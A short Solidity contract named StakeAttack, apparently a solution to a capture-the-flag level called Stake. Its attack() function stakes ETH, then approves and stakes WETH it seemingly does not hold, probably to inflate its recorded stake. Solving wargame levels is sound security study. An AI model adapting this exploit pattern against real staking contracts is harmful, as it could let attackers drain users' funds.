// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../levels/Stake.sol";
import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract StakeAttack {
    Stake public immutable stake;

    constructor(Stake _stake){
        stake = _stake;
    }
    function attack() external payable{
        stake.StakeETH{value: msg.value}();
        ERC20 weth = ERC20(stake.WETH());
        weth.approve(address(stake), 0.002 ether);
        stake.StakeWETH(0.002 ether);
    }
}
